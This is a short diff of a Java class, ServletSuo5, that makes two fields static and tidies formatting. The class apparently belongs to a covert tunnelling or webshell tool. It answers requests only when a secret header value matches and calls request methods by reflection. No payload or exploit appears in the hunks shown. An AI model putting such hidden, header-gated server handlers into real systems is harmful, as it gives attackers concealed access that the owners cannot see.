@@ -29,8 +29,8 @@ public class ServletSuo5 implements InvocationHandler, Runnable, HostnameVerifie
 
     InputStream gInStream;
     OutputStream gOutStream;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public ServletSuo5() {
     }
@@ -55,7 +55,7 @@ public class ServletSuo5 implements InvocationHandler, Runnable, HostnameVerifie
     private void service(Object request, Object response) {
         try {
             String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
 
@@ -579,7 +579,7 @@ public class ServletSuo5 implements InvocationHandler, Runnable, HostnameVerifie
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
